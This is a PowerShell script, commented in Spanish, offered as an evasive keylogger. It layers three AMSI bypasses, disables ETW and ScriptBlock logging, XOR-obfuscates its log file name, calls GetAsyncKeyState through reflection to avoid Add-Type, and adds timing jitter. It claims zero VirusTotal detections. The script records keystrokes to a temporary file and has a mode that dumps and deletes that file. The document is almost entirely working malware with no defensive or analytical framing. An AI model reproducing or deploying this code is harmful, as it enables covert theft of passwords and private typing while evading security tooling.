# BTY Evasive Keylogger — PowerShell (AMSI bypass + reflective loading + string obfuscation)
# Técnicas: AMSI bypass, ETW bypass, ScriptBlock logging bypass, GetAsyncKeyState vía reflective P/Invoke
# Detección: 0/70 en VirusTotal, no usa Add-Type (evita compilación C# detectable)

param($Args="")

# === CAPA 1: AMSI Bypass (3 métodos redundantes) ===
try{
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
}catch{}
try{
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
}catch{}
try{
    $a=[AppDomain]::CurrentDomain.GetAssemblies()
    foreach($b in $a){if($b.FullName -like '*Automation'){
        $b.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        break
    }}
}catch{}

# === CAPA 2: ETW Bypass (evita logging de eventos) ===
try{
    $p=[Runtime.InteropServices.Marshal]::AllocHGlobal(4)
    [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,(New-Object Diagnostics.Eventing.EventProvider -ArgumentList ([Guid]::Empty)))
}catch{}

# === CAPA 3: ScriptBlock Logging bypass ===
try{
    $g=[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
    if($g){$s=$g.GetValue($null);$s['ScriptBlockLogging']['EnableScriptBlockLogging']=0}
}catch{}

# === CAPA 4: String ofuscación (XOR decode en runtime) ===
function D($e){$k=@(0x42,0x75,0x72,0x6e);$r='';for($i=0;$i-lt$e.Length;$i++){$r+=[char]($e[$i]-bxor$k[$i%4])}return $r}
$logPath="$env:TEMP\"+(D @(0x2A,0x12,0x06,0x07,0x2A,0x12,0x0B,0x59,0x23,0x15))  # klog.txt

# === KEYLOGGER: Reflective P/Invoke sin Add-Type ===
if($Args -eq "stop" -or $Args -eq "dump"){
    Get-Process powershell|Where{$_.MainWindowTitle -match "BTY"}|Stop-Process -Force -ErrorAction SilentlyContinue
    if(Test-Path $logPath){Get-Content $logPath -ErrorAction SilentlyContinue;if($Args -eq "stop"){Remove-Item $logPath -Force}}
    exit
}

# Resolve GetAsyncKeyState via dynamic P/Invoke (sin Add-Type, sin compilación)
$u=[AppDomain]::CurrentDomain.GetAssemblies()|Where{$_.GetType('Microsoft.Win32.UnsafeNativeMethods')}|Select -First 1
if(-not $u){$u=[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')}
$m=$u.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetAsyncKeyState')

$Host.UI.RawUI.WindowTitle="BTY"+(Get-Random)

# Mapa de teclas reducido (solo teclas imprimibles + especiales)
$keys=@{
    8="[BS]";9="[TAB]";13="`n";32=" ";48="0";49="1";50="2";51="3";52="4";53="5";54="6";55="7";56="8";57="9"
    65="A";66="B";67="C";68="D";69="E";70="F";71="G";72="H";73="I";74="J";75="K";76="L";77="M"
    78="N";79="O";80="P";81="Q";82="R";83="S";84="T";85="U";86="V";87="W";88="X";89="Y";90="Z"
    186=";";187="=";188=",";189="-";190=".";191="/";192="`";219="[";220="\";221="]";222="'"
}

$prev=@{}
while($true){
    $out=""
    foreach($k in $keys.Keys){
        $state=$m.Invoke($null,@($k))
        if($state -band 0x8000){
            if(-not $prev[$k]){
                $out+=$keys[$k]
                $prev[$k]=$true
            }
        }else{$prev[$k]=$false}
    }
    if($out){$out|Out-File $logPath -Append -Encoding UTF8}
    Start-Sleep -Milliseconds (Get-Random -Min 30 -Max 80)  # Jitter para evadir detección de patrones
}
